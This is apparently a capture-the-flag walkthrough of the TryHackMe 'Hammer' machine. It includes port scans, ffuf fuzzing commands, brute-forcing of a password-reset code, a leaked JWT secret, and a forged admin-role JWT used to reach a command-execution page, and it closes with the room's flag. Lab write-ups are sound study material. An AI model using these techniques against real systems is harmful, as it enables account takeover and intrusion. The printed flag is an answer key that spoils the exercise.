Today we are back with another TryHackMe challenge medium listed linux and web based machine to solve named Hammer.

So we have been given Main IP :: 10.48.188.92

Let's start with all port scan for now.

Nmap scan report for ip-10-48-188-92.ap-south-1.compute.internal (10.48.188.92)
Host is up, received echo-reply ttl 64 (0.00016s latency).
Scanned at 2026-08-21 03:54:15 UTC for 2s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
1337/tcp open  waste   syn-ack ttl 64

Let's continue with this and perform service and version detection scan for now.

Nmap scan report for ip-10-48-188-92.ap-south-1.compute.internal (10.48.188.92)
Host is up, received echo-reply ttl 64 (0.00024s latency).
Scanned at 2026-08-21 03:55:25 UTC for 12s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:c3:b9:ab:7e:b2:83:20:46:3b:41:05:ae:79:c4:0a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYNeLN7xw6sWV+7/uOJu70XPRuM1w2Xl4kF2C49fcDtzXUnWJYA6S/H+61EvdhH0lfvmifj3f249Yl2C2aqaP6Jjfho4twvgDOF3iqFExp9VVklM2BvPF8E9uxJpvW/jfOZquq+Fv/WRw/JbMs3bhhKdUHo6bwY+myRKewWc4xLbXWuFrvcmjyKBK1Fubc4/dmLNSxLv+6VWR4V/1zlDqwJGvpCFNERq2+gSxV31SnImhBd7zqHT3TTDClavm7hm4k63UyNhE4pevwgkXpa+8F8KS1H4KXP/oBxPc6oMKDE2jiIm+yjjPzUdaf0SoqrAxafyI3K3gg+QCjVwk0CSSUafyZ6Gq8mlB3oPuW4Co+pF4ARytG+G98FbsbP7NODs2KNlNBA7GKaqMuSsBH3a2VFP0vIrXXKevFylZd4pNm5Ewup6StfTth0P5CBe/vlNhjzmDeJJBgJ6jRB9VJLv7Id3nptpYiyjE22twH8OGoSzc+fnjnk9pVYZ7GvLq0CaM=
|   256 95:21:4e:6f:63:ef:92:d9:e6:3e:db:2d:2f:a5:47:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjJKSnCUuCC6gUBgIxoWbF7ibwHp8BGeMcDTXS2fMM5a/BZnnxYduNIlvcZ3ikPJghq99YOVxYmGLuyIDtVjAQ=
|   256 eb:2f:15:58:26:36:49:1d:0b:a5:f3:16:36:69:0d:2e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOIZBZObD3r7hI0nbaQptivozS2/3hBIxAvudnIHEpGS
1337/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

So we can see kind of webpage on to the port 1337 for now.

So let's move to there before that let's add hammer.thm along with the IP in /etc/hosts file.

So while moving to the web page we saw the normal page and in the source page we saw.

	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
	
So let's fuzz things that way using ffuf for now.

ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -ac

at first we will start with the directories where we get /images,cs,js and logs and all.

now time for the file fuzzing scanning.

So by going to hmr_logs

we get [Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down

and with this we can see different different directories present here.

Ok so there is a forgot password page for now which i think needed to be brute forced

also we need to create a script for it.

https://github.com/naval0505/Automation-Tools-for-Red-Teaming/tree/main/

I got the script from here and let's try about it now.

and with the above script we got this

[+] Success with code: 5092
	[+] Success with code: 7595

And with it we are able 
to create the new password and with it we will be to get along with it.

So with the ls command we are able to get the 
ls
188ade1.key
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor

this all so let's try to get back into it.

Brief explanation of how the website verifies the session: when the website starts with a correct session, it generates a JWT, which is then saved in my browser and in a function, after I click the “submit” button this token is sended as a header. This JWT has the important payloads of ‘user_Id’ and “role,” which allow the page to verify which commands the user can execute. All of this is verified through its signature, which, as the header says, has its secret in a file called key.key.

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzg3Mjg2MjA5LCJleHAiOjE3ODcyODk4MDksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.7ptHbeDMuGCJnpJvkx6LSLhN9vi6xbQOg8Idwst7ir8

 /home/kali/Downloads/188ade1.key .                           
                                                                     
┌──(root㉿kali)-[/home/kali/thm/hammer]
└─# cat 188ade1.key 
56058354efb3daa97ebab00fabd7a7d7
so from decoding we will get the key looks like md5 hash for now.

which is kind of secret for jwt now that we can create a new one with the admin functionality for now.

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzg3Mjg2MjA5LCJleHAiOjE3ODcyODk4MDksImRhdGEiOnsidXNlcl9pZCI6MCwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.YB-4ZE4O2GbcSsBJP_ScTLMe5WIiKVTC26bCEF7z0Uc


(Ignore the fact that it says “Jwt expired”, if yours is expired too just extend the “exp” field)

Now we just send this with burp’s repeater and… command not allowed?

THM{RUNANYCOMMAND1337}

 and we get this.
 
 



